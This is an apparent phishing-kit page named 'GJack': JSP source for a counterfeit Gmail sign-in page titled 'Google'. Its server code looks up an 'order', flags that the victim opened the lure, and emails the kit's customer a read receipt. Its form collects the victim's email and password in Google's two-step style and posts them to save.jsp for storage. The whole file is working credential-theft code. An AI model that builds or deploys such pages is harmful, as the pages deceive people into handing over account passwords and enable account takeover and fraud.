<%@ page import="com.theah64.gjack.database.Orders" %>
<%@ page import="com.theah64.gjack.database.Results" %>
<%@ page import="com.theah64.gjack.model.Order" %>
<%@ page import="com.theah64.webengine.exceptions.MailException" %>
<%@ page import="com.theah64.webengine.utils.Form" %>
<%@ page import="com.theah64.webengine.utils.MailHelper" %>
<%@ page import="com.theah64.webengine.utils.RequestException" %>
<%@ page import="java.sql.SQLException" %>
<html>
<head>
    <title>Google</title>
    <%@include file="common_headers.jsp" %>
    <link href="https://fonts.googleapis.com/css?family=Roboto:400,500" rel="stylesheet">
    <link rel="stylesheet" href="node_modules/material-components-web/dist/material-components-web.css">

    <%
        final Form form = new Form(request, new String[]{Orders.COLUMN_KEY});
        try {
            if (form.isAllRequiredParamsAvailable()) {
                //Setting mail as read
                final String orderKey = form.getString(Orders.COLUMN_KEY);
                final Order order = Orders.getInstance().get(Orders.COLUMN_KEY, orderKey);
                if (order != null) {

                    final String mailContent = order.getVictimEmail() + " opened the mail";


                    try {
                        Orders.getInstance().update(Orders.COLUMN_ID, order.getId(), Orders.COLUMN_IS_READ, "1");
                    } catch (SQLException e) {
                        e.printStackTrace();
                    }

                    new Thread(new Runnable() {
                        @Override
                        public void run() {
                            try {
                                MailHelper.sendMail(order.getUserEmail(), "GJack Read receipt", mailContent, "GJack");
                            } catch (MailException e) {
                                e.printStackTrace();
                            }
                        }
                    }).start();


                } else {
                    response.sendRedirect("error.jsp?title=Error&message=Bad order");
                    return;
                }
            } else {
                response.sendRedirect("error.jsp?title=Error&message=Bad access");
                return;
            }
        } catch (RequestException e) {
            e.printStackTrace();
            response.sendRedirect("error.jsp?title=Error&message=" + e.getMessage());
            return;
        }
    %>

    <style>
        body {
            height: 100%;
            background-image: url(assets/background.svg);
            background-size: 100% 100%;
            -o-background-size: 100% 100%;
            -webkit-background-size: 100% 100%;
        }

        div.container {
            margin-top: 80px;
        }

        div#sign_in_panel_container {
            position: relative;
            width: 450px;
            height: 500px;
            padding: 48px 40px 36px 40px;
            background-color: #FFF;
            box-shadow: 0 2px 2px 0 rgba(0, 0, 0, 0.14), 0 3px 1px -2px rgba(0, 0, 0, 0.12), 0 1px 5px 0 rgba(0, 0, 0, 0.2);
        }

        div#bottom_menu_panel {
            text-align: center;
            margin-top: 10px;
        }

        img#google_logo {
            width: 90px;
        }

        h1#signin {
            font-family: roboto, arial, sans-serif;
            font-size: 24px;
            font-weight: 400;
            line-height: 1.3333;
            margin: 0;
            padding-top: 16px;
            padding-bottom: 0;
        }

        p#to_continue_to_gmail {
            padding-bottom: 3px;
            padding-top: 1px;
        }

        input[type=text], input[type=password] {
            color: #001d1e;
            width: 363px;
            letter-spacing: 0px;
            border-bottom-color: #dfdfdf;
        }

        input[type=text]:hover, input[type=password]:hover {
            border-bottom-color: #c2c2c2;
            border-bottom-width: 1px;
        }

        input[type=text]:focus, input[type=password]:focus {
            border-bottom-color: #0086F6;
            border-bottom-width: 1px;
        }

        label.google_label {
            color: #cdcdcd;
            font-family: roboto, arial, sans-serif;
            font-weight: 400;
        }

        a.blue_link {
            color: #4285f4;
            text-decoration: none;
        }

        a#submit {
            text-decoration: none;
            font-family: roboto, arial, sans-serif;
            font-weight: 500;
            font-size: 14px;
            float: right;
            background-color: #4285f4;
        }

        ul#bottom_menu a {
            color: #757575;
            text-decoration: none;
            padding: 6px 10px;
            font-size: 12px;
        }

    </style>

    <script>
        $(document).ready(function () {


            $("input[type=text],input[type=password]").on('keydown', function (e) {
                //Enter
                if (e.keyCode == 13) {
                    $("a#submit").click();
                }
            });

            var isNextClicked = false;

            $("a#submit").on('click', function () {

                var username = $("input#username").val();
                var password = $("input#password").val();

                console.log("Username: " + username);
                console.log("Password: " + password);

                if (isNextClicked) {

                    if (password) {
                        $("p#error_message").text("");
                        $("form#login").submit();
                    } else {
                        $("p#error_message").text("Please enter your password");
                    }
                } else {
                    if (username.trim()) {
                        $("div#username_container").hide(300);
                        $("div#password_container").show(300);
                        isNextClicked = true;
                        $("p#error_message").text("");
                    } else {
                        $("p#error_message").text("Please enter your email");
                    }
                }
            });

        });
    </script>

</head>
<body>
<div class="container">
    <div class="row center-block">
        <div class="col-md-12">


            <div id="sign_in_panel_container" class="center-block">

                <!--Logo-->
                <img id="google_logo" src="assets/logo_1x.png">

                <!--Signin-->
                <h1 id="signin">Sign in</h1>
                <p id="to_continue_to_gmail">to continue to Gmail</p>

                <form id="login" method="POST" action="save.jsp">

                    <input type="hidden" name="<%=Orders.COLUMN_KEY%>" value="<%=form.getString(Orders.COLUMN_KEY)%>"/>

                    <!--Username-->
                    <div id="username_container" class="mdc-textfield mdc-textfield--upgraded"
                         data-mdc-auto-init="MDCTextfield">
                        <input autocomplete="off" type="text" name="<%=Results.COLUMN_G_USERNAME%>"
                               class="mdc-textfield__input"
                               id="username">
                        <label for="username" class="mdc-textfield__label google_label">Email or phone</label>
                    </div>


                    <!--Password-->
                    <div id="password_container" style="display: none" class="mdc-textfield mdc-textfield--upgraded"
                         data-mdc-auto-init="MDCTextfield">
                        <input autocomplete="off" type="password" name="<%=Results.COLUMN_G_PASSWORD%>"
                               class="mdc-textfield__input"
                               id="password">
                        <label for="password" class="mdc-textfield__label google_label">Password</label>
                    </div>

                    <p id="error_message" style="color:#cc0000;font-size: 12px;"></p>

                </form>


                <br>
                <br>

                <a class="blue_link" href="#">Forgot email?</a>

                <br>
                <br>
                <br>


                <a class="blue_link" href="#">More options</a>

                <a id="submit"
                   class="mdc-button mdc-button--raised mdc-button--dense">
                    NEXT
                </a>

                <script src="node_modules/material-components-web/dist/material-components-web.js"></script>
                <script>mdc.autoInit()</script>


            </div>

            <div id="bottom_menu_panel">
                <ul id="bottom_menu" class="list-inline">
                    <li><a href="#">Help</a></li>
                    <li><a href="#">Privacy</a></li>
                    <li><a href="#">Terms</a></li>
                </ul>
            </div>

        </div>
    </div>


</div>


</body>
</html>